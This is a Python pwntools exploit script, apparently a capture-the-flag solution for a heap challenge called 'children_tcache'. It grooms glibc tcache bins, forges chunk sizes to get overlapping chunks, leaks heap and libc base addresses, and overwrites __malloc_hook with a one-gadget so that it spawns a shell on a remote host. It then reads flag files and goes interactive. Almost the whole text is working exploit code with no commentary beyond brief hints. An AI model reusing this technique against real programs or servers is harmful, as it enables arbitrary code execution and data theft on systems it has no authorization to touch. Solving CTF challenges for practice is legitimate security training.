from pwn import *

#r = process('./children_tcache', env={'LD_PRELOAD':'./libc.so.6'})
r = process('./children_tcache')
r = remote('54.178.132.125', 8763)
#context.log_level = 'debug'
libc = ELF('./libc.so.6')

def new(content, size=None):
    if not size:
        size = len(content)
    r.sendafter('Your choice: ', '1'+'\x00'*15)
    r.sendlineafter('Size:', str(size))
    r.sendafter('Data:', content)
def leak(idx):
    r.sendafter('Your choice: ', '2'+'\x00'*15)
    r.sendafter('Index:', str(idx))
def delete(idx):
    r.sendafter('Your choice: ', '3'+'\x00'*15)
    r.sendafter('Index:', str(idx))

for i in range(8):
    new('A'*0x110)
new('A'*0xf0)
for i in range(7):
    delete(i)
for i in range(7):
    new('A'*0xf0)
for i in range(7):
    delete(i)
delete(7)

new('A', size=0x80)
new('\n', size=0x10)#victim 1
new('\n', size=0x10)#victim 2
new('\n', size=0x20)#victim 3
new('B'*0x18)
for i in range(7):
    delete(4)
    new('C'*0x10+'C'*(7-i))
delete(4)
new('C'*0x10+p64(0x120))
delete(1)
delete(2)
delete(3)
# exhaust 0x90 tcache bin so that it will be placed in unsorted bin later
for i in range(7):
    new('D'*0x80)
for i in range(5):
    delete(2*i+1)
delete(2)
delete(6)

# reorder tcache bins
new('E'*0x10)
new('E'*0x10)
delete(1)
delete(2)
new('E'*0x30)
delete(1)

# cause overlapping
delete(0)
delete(8)

new('A'*0x30)
new('A'*0x30)
new('A'*0x40)
new('D'*0x30)
new('D'*0x10)

delete(0)
delete(5)

# leak heap
leak(3)
heap_base = u64(r.recvuntil('\n$$$$$')[:6]+'\x00\x00') - 0x1750
log.info('heap_base: %#x' % heap_base)

# clean bucket
delete(3)
delete(4)
for i in range(8):
    new('A', size=0x80)
delete(0)
for i in range(6):
    delete(3+i)
new('A', size=0x20)
delete(9)

# leak libc
leak(0)
libc_base = u64(r.recvuntil('\n$$$$$')[:6]+'\x00\x00') - libc.symbols['__malloc_hook'] - 0x70
log.info('libc_base: %#x' % libc_base)
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
magic = libc_base + 0x10a38c
system = libc_base + libc.symbols['system']

# trigger
new(p64(__malloc_hook), size=0x30)
new('A', 0x30)
new(p64(magic), size=0x30)

r.sendafter('Your choice: ', '1'+'\x00'*15)
r.sendlineafter('Size:', str(10))
r.sendline('ls /home')
r.sendline('cat /home/*/flag*')

r.interactive()
